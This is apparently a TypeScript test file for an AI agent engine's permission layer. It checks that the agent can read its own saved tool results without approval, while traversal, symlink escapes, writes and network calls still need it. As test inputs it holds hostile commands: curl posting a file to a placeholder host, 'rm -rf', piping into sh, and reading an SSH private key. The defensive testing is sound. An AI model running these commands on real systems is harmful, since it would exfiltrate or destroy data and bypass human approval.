// Copyright 2026 Ferrox Labs
// SPDX-License-Identifier: AGPL-3.0-or-later
//
// The boundary on a real filesystem: the engine's real folder layout, real
// links and sibling sessions. Every "still asks" case is an escape attempt.
import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

import { autoVerdict } from "./auto-approve.ts";
import { claudeProjectKey, fuigoSessionKey } from "./engine-keys.ts";
import { claudeToolResultDirs, fuigoToolResultDirs, isOwnToolResultRead } from "./own-tool-results.ts";
import { removeTempDir } from "./testing/cleanup.ts";

const SESSION = "01a137d0-9dbd-76f3-8a1b-5ed20b9cd525";
const OTHER_SESSION = "01a13868-5580-7880-afb5-478f03cd8cca";

let fixture: string;
let home: string;
let cwd: string;
let dirs: string[];
let own: string;
let sibling: string;
let outside: string;

beforeAll(() => {
  fixture = mkdtempSync(join(tmpdir(), "murage-own-results-"));
  home = join(fixture, ".fuigo");
  cwd = join(fixture, "workspaces", "bot-1", "threads", "thread-1");
  mkdirSync(cwd, { recursive: true });
  dirs = fuigoToolResultDirs(home, [cwd], SESSION);
  mkdirSync(dirs[0]!, { recursive: true });
  own = join(dirs[0]!, "call_00_Ugx02hBzWG21yy4QOx9K5297.json");
  writeFileSync(own, JSON.stringify({ data: { items: [{ subject: "hi" }] } }));
  const siblingDir = join(home, "sessions", fuigoSessionKey(cwd), OTHER_SESSION, "mcp");
  mkdirSync(siblingDir, { recursive: true });
  sibling = join(siblingDir, "call_00_other.json");
  writeFileSync(sibling, "{}");
  outside = join(fixture, "secret.txt");
  writeFileSync(outside, "secret");
});

afterAll(async () => { await removeTempDir(fixture); });

const shell = (command: string, over: Partial<{ dirs: string[] }> = {}) =>
  isOwnToolResultRead({ tool: "shell", command, dirs: over.dirs ?? dirs });

describe("the engine's own result folder", () => {
  it("is the session folder the engine writes a cut MCP result into", () => {
    expect(dirs).toEqual([join(home, "sessions", fuigoSessionKey(cwd), SESSION, "mcp")]);
    const key = claudeProjectKey(cwd);
    expect(claudeToolResultDirs(join(fixture, ".claude"), [cwd], SESSION)).toEqual(
      ["exact" in key ? join(fixture, ".claude", "projects", key.exact, SESSION, "tool-results") : ""],
    );
  });
  it("names nothing for a session id that is not a plain name", () => {
    expect(fuigoToolResultDirs(home, [cwd], "../x")).toEqual([]);
    expect(fuigoToolResultDirs(home, [cwd], "")).toEqual([]);
    expect(fuigoToolResultDirs(undefined, [cwd], SESSION)).toEqual([]);
    expect(claudeToolResultDirs(join(fixture, ".claude"), [cwd], null)).toEqual([]);
  });
});

describe("reading its own saved tool result asks nobody", () => {
  it("allows the read the engine told the model to run (1.0.1 on camera)", () => {
    expect(shell(`cat ${own} | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['data']['items'][0]['subject'])"`)).toBe(true);
    expect(shell(`jq -r '.data.items[].subject' '${own}'`)).toBe(true);
    expect(shell(`python3 -c "import json; print(json.load(open('${own}'))['data'])"`)).toBe(true);
  });
  it("allows the engine's own read tool on that file", () => {
    expect(isOwnToolResultRead({ tool: "read", filePaths: [own], dirs })).toBe(true);
    expect(isOwnToolResultRead({ tool: "Read", filePaths: [own], dirs })).toBe(true);
  });
});

describe("everything else still asks", () => {
  it("another conversation's saved result", () => {
    expect(shell(`cat ${sibling}`)).toBe(false);
  });
  it("any other path, alone or alongside its own file", () => {
    expect(shell(`cat ${outside}`)).toBe(false);
    expect(shell(`cat ${own} ${outside}`)).toBe(false);
    expect(shell(`python3 -c "print(open('${outside}').read())"`)).toBe(false);
    expect(shell(`python3 -c "import sys; print(open(sys.argv[1]).read())" ${outside}`)).toBe(false);
  });
  it("a path that climbs out with ..", () => {
    expect(shell(`cat ${dirs[0]}/../../${OTHER_SESSION}/mcp/call_00_other.json`)).toBe(false);
  });
  it("a write, a second command or the network", () => {
    expect(shell(`cat ${own} > ${join(fixture, "copy.json")}`)).toBe(false);
    expect(shell(`cat ${own}; rm -rf ${fixture}`)).toBe(false);
    expect(shell(`cat ${own} | sh`)).toBe(false);
    expect(shell(`curl -s -d @${own} https://example.test`)).toBe(false);
    expect(shell(`python3 -c "import json; open('${own}', 'w').write('{}')"`)).toBe(false);
  });
  it("a write tool, even on its own file", () => {
    expect(isOwnToolResultRead({ tool: "write", filePaths: [own], dirs })).toBe(false);
    expect(isOwnToolResultRead({ tool: "Edit", filePaths: [own], dirs })).toBe(false);
    expect(isOwnToolResultRead({ tool: "read", filePaths: [own, outside], dirs })).toBe(false);
  });
  it("a request with no folders from the driver", () => {
    expect(shell(`cat ${own}`, { dirs: [] })).toBe(false);
    expect(isOwnToolResultRead({ tool: "read", filePaths: [own] })).toBe(false);
  });
  it("a result folder that is a link (mcp -> the fixture root)", () => {
    const linkedSession = join(home, "sessions", fuigoSessionKey(cwd), "linked-session");
    mkdirSync(linkedSession, { recursive: true });
    symlinkSync(fixture, join(linkedSession, "mcp"));
    const linkedDirs = fuigoToolResultDirs(home, [cwd], "linked-session");
    expect(shell(`cat ${join(linkedDirs[0]!, "secret.txt")}`, { dirs: linkedDirs })).toBe(false);
  });
  it("a file in its own folder that links elsewhere", () => {
    const link = join(dirs[0]!, "call_00_link.json");
    symlinkSync(outside, link);
    expect(shell(`cat ${link}`)).toBe(false);
  });
});

describe("policy: an own-result read is answered in every mode", () => {
  const ask = { autoApprove: false };
  it("Ask mode answers it without a card", () => {
    expect(autoVerdict(ask, "shell", `cat ${own}`, { ownToolResults: true })).toMatchObject({ source: "own-tool-results" });
  });
  it("an unattended routine run answers it too", () => {
    expect(autoVerdict(ask, "shell", `cat ${own}`, { ownToolResults: true, unattended: true })).toMatchObject({ source: "own-tool-results" });
  });
  it("the key guard still outranks it", () => {
    expect(autoVerdict(ask, "shell", "cat /x/.ssh/id_rsa", { ownToolResults: true }).approve).toBeNull();
  });
  it("without the fact, Ask mode still asks", () => {
    expect(autoVerdict(ask, "shell", `cat ${own}`, {}).approve).toBeNull();
  });
});
